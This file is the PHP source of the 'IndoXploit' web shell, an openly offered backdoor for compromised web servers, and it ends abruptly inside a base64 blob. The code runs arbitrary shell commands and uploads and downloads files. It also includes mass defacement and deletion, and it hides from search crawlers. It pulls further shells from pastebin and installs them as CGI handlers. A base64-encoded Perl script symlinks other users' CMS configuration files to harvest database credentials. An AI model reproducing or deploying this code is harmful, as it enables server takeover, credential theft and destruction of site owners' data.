<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$password = "b71c31bca4b9d422190405c8f24049fb"; # password: privdayz

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE HTML>
<html>
<head>
<meta name="robots" content"noindex. nofollow">
<title>IndoXploit</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: green;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: red;
	background: transparent;
	border: 1px dotted green;
	margin-left: 20px;
	text-align: center;
}
</style>
</head>
<center>
<header>
	<pre>
 ___________________________
< root@indoxploit:~# w00t??? >
 ---------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
            /- _  `-/  '
           (/\/ \ \   /\
           / /   | `    \
           O O   ) /    |
           `-^--'`<     '
          (_.)  _  )   /
           `.___/`    /
             `-----' /
<----.     __ / __   \
<----|====O)))==) \) /====>
<----'    `--' `.__,' \
             |        |
              \       /
        ______( (_  / \______
      ,'  ,-----'   |        \
      `--{__________)        \/
	</pre>
</header>
<form method="post">
<input type="password" name="password">
</form>
<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>
<?php
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();

if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
?>
<!DOCTYPE HTML>
<html>
<!--
###############################################################################
// Thanks buat Orang-orang yg membantu dalam proses pembuatan shell ini.
// Shell ini tidak sepenuhnya 100% Coding manual, ada beberapa function dan tools kita ambil dari shell yang sudah ada.
// Tapi Selebihnya, itu hasil kreasi IndoXploit sendiri.
// Tanpa kalian kita tidak akan BESAR seperti sekarang.
// Greetz: All Member IndoXploit. & All My Friends.
###############################################################################
// Special Thanks: Depok Cyber Security | Sanjungan Jiwa | 0x1999
###############################################################################
-->
<head>
<title>IndoXploit</title>
<meta name='author' content='IndoXploit'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
	color: #ffffff;
	font-size: 14px;
	width: 100%;
}

li {
	display: inline;
	margin: 5px;
	padding: 5px;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: gold;
	text-decoration: underline;
}

b {
	color: gold;
}

pre {
	font-size: 13px;
}

table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}

.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}

.th_home {
	color: lime;
}

.td_home, .td_home > a {
	color: #ffffff;
}

.td_home > a:hover {
	color: gold;
}

th {
	padding: 10px;
}

tr:hover {
	background: #006400;
	color: #ffffff;
}

input[type=text], input[type=password], .input {
	background: transparent; 
	color: #ffffff;
	border: 1px solid #ffffff;
	padding: 3px;
	font-family: 'Ubuntu';
	font-size: 13px;
}

input[type=submit] {
	padding: 2px;}

input[type=submit]:hover {
	cursor: pointer;
}

input:focus, textarea:focus {
  outline: 0;
  border-color: #ffffff;
}

textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
iframe {
	width: 100%;
	min-height: 500px;
}
</style>
</head>
<body>
<?php
function path() {
	if(isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}

function color($bold = 1, $colorid = null, $string = null) {
		$color = array(
			"</font>",  			# 0 off
			"<font color='red'>",	# 1 red 
			"<font color='lime'>",	# 2 lime
			"<font color='white'>",	# 3 white
			"<font color='gold'>",	# 4 gold
		);

	return ($string !== null) ? $color[$colorid].$string.$color[0]: $color[$colorid];
}

function OS() {
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function exe($cmd) {
	if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}

function save($filename, $mode, $file) {
	$handle = fopen($filename, $mode);
	fwrite($handle, $file);
	fclose($handle);
	return;
}

function getfile($name) {
	if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't spawn $name."));
	if($name === "adminer") $get = array("https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php", "adminer.php");
	elseif($name === "webconsole") $get = array("https://pastebin.com/raw/2i96fDCN", "webconsole.php");
	elseif($name === "cgitelnet1") $get = array("https://pastebin.com/raw/Lj46KxFT", "idx_cgi/cgitelnet1.idx");
	elseif($name === "cgitelnet2") $get = array("https://pastebin.com/raw/aKL2QWfS", "idx_cgi/cgitelnet2.idx");

	$fp = fopen($get[1], "w");
	$ch = curl_init();
	 	  curl_setopt($ch, CURLOPT_URL, $get[0]);
	 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	 	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	   	  curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	   	  curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}

function usergroup() {
	if(!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function getuser() {
	$fopen = fopen("/etc/passwd", "r") or die(color(1, 1, "Can't read /etc/passwd"));
	while($read = fgets($fopen)) {
		preg_match_all('/(.*?):x:/', $read, $getuser);
		$user[] = $getuser[1][0];
	}
	return $user;
}

function getdomainname() {
	$fopen = fopen("/etc/named.conf", "r");
	while($read = fgets($fopen)) {
		preg_match_all("#/var/named/(.*?).db#", $read, $getdomain);
		$domain[] = $getdomain[1][0];
	}
	return $domain;
}

function hddsize($size) {
	if($size >= 1073741824)
		return sprintf('%1.2f',$size / 1073741824 ).' GB';
	elseif($size >= 1048576)
		return sprintf('%1.2f',$size / 1048576 ) .' MB';
	elseif($size >= 1024)
		return sprintf('%1.2f',$size / 1024 ) .' KB';
	else
		return $size .' B';
}

function hdd() {
	$hdd['size'] = hddsize(disk_total_space("/"));
	$hdd['free'] = hddsize(disk_free_space("/"));
	$hdd['used'] = $hdd['size'] - $hdd['free'];
	return (object) $hdd;
}

function writeable($path, $perms) {
	return (!is_writable($path)) ? color(1, 1, $perms) : color(1, 2, $perms);
}

function perms($path) {
	$perms = fileperms($path);
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} 
	elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} 
	elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} 
	elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} 
	elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} 
	elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} 
	elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} 
	else {
		// Unknown
		$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function lib_installed() {
	$lib[] = "MySQL: ".(function_exists('mysql_connect') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "cURL: ".(function_exists('curl_version') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "WGET: ".(exe('wget --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Perl: ".(exe('perl --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	$lib[] = "Python: ".(exe('python --help') ? color(1, 2, "ON") : color(1, 1, "OFF"));
	return implode(" | ", $lib);
}

function pwd() {
	$dir = explode("/", path());
	foreach($dir as $key => $index) {
		print "<a href='?dir=";
		for($i = 0; $i <= $key; $i++) {
			print $dir[$i];
			if($i != $key) {
			print "/";
			}
		}
		print "'>$index</a>/";
	}
	print "<br>";
	print (OS() === "Windows") ? windisk() : "";
}

function windisk() {
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	 foreach(range("A", "Z") as $letter) {
	  	$bool = $isdiskette = in_array($letter, array("A"));
	  	if(!$bool) $bool = is_dir("$letter:\\");
	  	if($bool) {
	   		$letters .= "[ <a href='?dir=$letter:\\'".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">";
	   		if($letter.":" != $v) {
	   			$letters .= $letter;
	   		}
	   		else {
	   			$letters .= color(1, 2, $letter);
	   		}
	   		$letters .= "</a> ]";
	  	}
	}
	if(!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if(count($quicklaunch) > 0) {
		foreach($quicklaunch as $item) {
	  		$v = realpath(path(). "..");
	  		if(empty($v)) {
	  			$a = explode(DIRECTORY_SEPARATOR,path());
	  			unset($a[count($a)-2]);
	  			$v = join(DIRECTORY_SEPARATOR, $a);
	  		}
	  		print "<a href='".$item[1]."'>".$item[0]."</a>";
		}
	}
}

function serverinfo() {
	$disable_functions = @ini_get('disable_functions');
	$disable_functions = (!empty($disable_functions)) ? color(1, 1, $disable_functions) : color(1, 2, "NONE");

	$output[] = "SERVER IP ".color(1, 2, $GLOBALS['SERVERIP'])." / YOUR IP ".color(1, 2, $_SERVER['REMOTE_ADDR']);
	$output[] = "WEB SERVER  : ".color(1, 2, $_SERVER['SERVER_SOFTWARE']);
	$output[] = "SYSTEM      : ".color(1, 2, php_uname());
	$output[] = "USER / GROUP: ".color(1, 2, usergroup()->name)."(".color(1, 2 , usergroup()->uid).") / ".color(1, 2 , usergroup()->group)."(".color(1, 2 , usergroup()->gid).")";
	$output[] = "HDD         : ".color(1, 2, hdd()->used)." / ".color(1, 2 , hdd()->size)." (Free: ".color(1, 2 , hdd()->free).")";
	$output[] = "PHP VERSION : ".color(1, 2, @phpversion());
	$output[] = "SAFE MODE   : ".(@ini_get(strtoupper("safe_mode")) === "ON" ? color(1, 2, "ON") : color(1, 2, "OFF"));
	$output[] = "DISABLE FUNC: $disable_functions";
	$output[] = lib_installed();
	$output[] = "Current Dir (".writeable(path(), perms(path())).") ";

	print "<pre>";
	print implode("<br>", $output);
	pwd();
	print "</pre>";

}

function curl($url, $post = false, $data = null) {
    $ch = curl_init($url);
    	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    	  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    	  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    	  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    	  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    if($post) {
    	  curl_setopt($ch, CURLOPT_POST, true);
    	  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    $curl['exec'] = curl_exec($ch);
	$curl['info'] = curl_getinfo($ch);

	return [
		"info" 		=> $curl['info'],
		"response" 	=> $curl['exec']
	];

		  curl_close($ch);
}

function reverse() {
	$response = curl("http://domains.yougetsignal.com/domains.php", TRUE, "remoteAddress=".$GLOBALS['SERVERIP']."&ket=")['response'];
	$response = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $response)))))))))))));
	$explode  = explode(",,", $response);
	unset($explode[0]);

	foreach($explode as $domain) {
		$domain = "http://$domain";
		$domain = str_replace(",", "", $domain);
		$url[] 	= $domain;
		ob_flush();
		flush();
	}

	return $url;
}

function getValue($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start 	= strpos($param, $kata1) + strlen($kata1);
    $end 	= strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}

function massdeface($dir, $file, $filename, $type = null) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === "." || $dir_ === "..") {
			file_put_contents($location, $file);
		}
		else {
			if(is_dir($path) AND is_writable($path)) {
				print "[".color(1, 2, "DONE")."] ".color(1, 4, $location)."<br>";
				file_put_contents($location, $file);
				if($type === "-alldir") {
					massdeface($path, $file, $filename, "-alldir");
				}
			}
		}
	}
}

function massdelete($dir, $filename) {
	$scandir = scandir($dir);
	foreach($scandir as $dir_) {
		$path     = "$dir/$dir_";
		$location = "$path/$filename";
		if($dir_ === '.') {
			if(file_exists("$dir/$filename")) {
				unlink("$dir/$filename");
			}
		} 
		elseif($dir_ === '..') {
			if(file_exists(dirname($dir)."/$filename")) {
				unlink(dirname($dir)."/$filename");
			}
		} 
		else {
			if(is_dir($path) AND is_writable($path)) {
				if(file_exists($location)) {
					print "[".color(1, 2, "DELETED")."] ".color(1, 4, $location)."<br>";
					unlink($location);
					massdelete($path, $filename);
				}
			}
		}
	}
}

function tools($toolsname, $args = null) {
	if($toolsname === "cmd") {
		print "<form method='post' action='?do=cmd&dir=".path()."' style='margin-top: 15px;'>
			  ".usergroup()->name."@".$GLOBALS['SERVERIP'].": ~ $
			  <input style='border: none; border-bottom: 1px solid #ffffff;' type='text' name='cmd' required>
			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input' type='submit' value='>>'>
			  </form>";
	}
	elseif($toolsname === "readfile") {
		if(empty($args)) die(color(1, 1, $msg));
		if(!is_file($args)) die(color(1, 1, "File '$args' is not exists."));

		print "<pre>";
		print htmlspecialchars(file_get_contents($args));
		print "</pre>";
	}
	elseif($toolsname === "spawn") {
		if($args === "adminer") {
			if(file_exists("adminer.php")) {
				print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'Adminer'."));
				if(getfile("adminer")) {
					print "Login Adminer: <a href='".$GLOBALS['FILEPATH']."/adminer.php' target='_blank'>http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/adminer.php</a>";
				}
				else {
					print color(1, 1, "Error while downloading file Adminer.");
					@unlink("adminer.php");
				}
			}
		}
		elseif($args === "webconsole") {
			if(file_exists("webconsole.php")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'WebConsole'."));
				if(getfile("webconsole")) {
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/webconsole.php' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file WebConsole.");
					@unlink("webconsole.php");
				}
			}
		}
		elseif($args === "cgitelnet1") {
			if(file_exists("idx_cgi/cgitelnet1.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet1.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet1")) {
					chmod('idx_cgi/cgitelnet1.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet1.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "cgitelnet2") {
			if(file_exists("idx_cgi/cgitelnet2.idx")) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
			}
			elseif(file_exists('cgitelnet2.idx')) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/cgitelnet2.idx' frameborder='0' scrolling='no'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_cgi'."));
				if(!is_dir(path()."/idx_cgi/")) {
					@mkdir('idx_cgi', 0755);
					save("idx_cgi/.htaccess", "w", "AddHandler cgi-script .idx");
				}
				if(getfile("cgitelnet2")) {
					chmod('idx_cgi/cgitelnet2.idx', 0755);
					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
				}
				else {
					print color(1, 1, "Error while downloading file CGI Telnet.");
					@rmdir(path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
				}
			}
	
		}
		elseif($args === "phpinfo") {
			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
			else {
				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
			}
		}
	}
	elseif($toolsname === "upload") {
		if($_POST['upload']) {
			if($_POST['uploadtype'] === '1') {
				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			} 
			elseif($_POST['uploadtype'] === '2') {
				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
					if(@copy($_FILES['file']['tmp_name'], $root)) {
						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
					} 
					else {
						$act = color(1, 1, "Failed to upload file!");
					}
				} 
				else {
					$act = color(1, 1, "Failed to upload file!");
				}
			}
		}
		print "Upload File: $act
			  <form method='post' enctype='multipart/form-data'>
			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
			  <input type='file' name='file'>
			  <input type='submit' value='upload' name='upload'>
			  </form>";
	}
	elseif($toolsname === "symlink") {
		$args = explode(" ", $args);

		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
		if(empty($args[0])) {
			if(!is_dir(path()."/idx_sym/")) {
				$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQoNCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgDQojICAgICAgICAgQ3JlYXRlZCA6IDEyIEZlYiAyMDE3DQojICAgICAgICAgQXV0aG9yIDogMHgxOTk5DQojICAgICAgICAgTW9yZSBJbmZvIDogaHR0cDovLzB4ZGFyay5ibG9nc3BvdC5jb20NCiMgICAgICAgICBXYW50IHRvIHJlY29kZSA/IERvbid0IGZvcmdldCBmaXJzdCBhdXRob3INCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMNCg0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCiMgICAgICAgICBSZWNvZGVkIEJ5IDogTDBjNGxoMzRydHogLSBJbmRvWHBsb2l0DQojICAgICAgICAgTW9yZSBJbmZvIDogaHR0cDovL2luZG94cGxvaXQub3IuaWQNCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMNCg0KDQp1c2UgRmlsZTo6Q29weTsNCmNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCm9wZW5kaXIgbXkgJGRpciwgIi92YXIvbWFpbCI7DQpteSBAZmlsZXMgPSByZWFkZGlyICRkaXI7DQpjbG9zZWRpciAkZGlyOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQp1c2Ugc3RyaWN0Ow0KdXNlIHdhcm5pbmdzOw0KbWtkaXIgImlkeF9zeW0iOw0KcHJpbnQgQGZpbGVzLiI8YnI+IjsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOw0Kd2hpbGUgKG15ICRyb3cgPSA8JGZoPikgew0KCWNob21wICRyb3c7DQoJbXkgQG1hdGNoZXMgPSAkcm93ID1+IC8oLio/KTp4Oi9nOw0KDQoJc3ltbGluaygiL2V0Yy9wYXNzd2QiLCJpZHhfc3ltL3Bhcy50eHQiKTsNCg0KCWlmICgtZCAiL2hvbWUiLiQxLiIvcHVibGljX2h0bWwvIikgeyANCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iLy5hY2Nlc3NoYXNoIiwiaWR4X3N5bS8iLiQxLiItV0hNLWFjY2Vzc2hhc2gudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAiLCJpZHhfc3ltLyIuJDEuIi1Mb2tvbWVkaWEudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItcGhwQkIudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCIsImlkeF9zeW0vIi4kMS4iLURydXBhbC50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwIiwiaWR4X3N5bS8iLiQxLiItUHJlc3RhU2hvcC50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2FwcC9ldGMvbG9jYWwueG1sIiwiaWR4X3N5bS8iLiQxLiItTWFnZW50by50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1PcGVuQ2FydC50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAiLCJpZHhfc3ltLyIuJDEuIi1FbGxpc2xhYi50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1WYnVsbGV0aW4udHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItVmJ1bGxldGluLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVZidWxsZXRpbi50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItVmJ1bGxldGluLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVZidWxsZXRpbi50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItTXlCQi50eHQiKTsNCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAiLCJpZHhfc3ltLyIuJDEuIi1Pc0NvbW1lcmNlLnR4dCIpOw0KCQlzeW1